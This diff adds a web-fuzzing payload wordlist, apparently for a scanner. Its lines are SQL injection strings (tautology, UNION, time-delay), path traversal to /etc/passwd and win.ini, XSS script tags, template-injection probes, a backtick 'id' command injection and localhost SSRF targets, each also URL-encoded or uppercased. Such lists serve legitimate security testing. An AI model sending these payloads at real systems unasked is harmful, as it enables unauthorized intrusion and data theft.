@@ -1,0 +1,80 @@
+' OR '1'='1 --
+' OR 1=1 --
+' UNION SELECT NULL --
+' UNION SELECT 1,2,3 --
+' AND SLEEP(5) --
+' OR IF(1=1,SLEEP(5),0) --
+1' AND '1'='2
+1' ORDER BY 100 --
+1';WAITFOR DELAY '0:0:5'--
+admin'--
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%27%20OR%20%271%27%3D%271%20--
+%27%20OR%201%3D1%20--
+%27%20UNION%20SELECT%20NULL%20--
+%27%20UNION%20SELECT%201%2C2%2C3%20--
+%27%20AND%20SLEEP%285%29%20--
+%27%20OR%20IF%281%3D1%2CSLEEP%285%29%2C0%29%20--
+1%27%20AND%20%271%27%3D%272
+1%27%20ORDER%20BY%20100%20--
+1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+admin%27--
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+ADMIN'--
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+<SCRIPT>ALERT(1)</SCRIPT>
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+ADMIN%27--
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+' OR '1'%3D'1 --
+' OR 1%3D1 --
+' OR IF(1%3D1,SLEEP(5),0) --
+1' AND '1'%3D'2
+' OR '1'%3D'1
+" OR "1"%3D"1
+' OR '1'='1 --?v=0
+' OR '1'='1 --&v=0
+%27%20OR%20%271%27%3D%271%20--_0
+sqli_0
+/sqli/0
+' OR '1'='1 --%0a0
+' OR 1=1 --?v=1
+' OR 1=1 --&v=1
+%27%20OR%201%3D1%20--_1
+sqli_1
+/sqli/1
+' OR 1=1 --%0a1
+' UNION SELECT NULL --?v=2
+' UNION SELECT NULL --&v=2
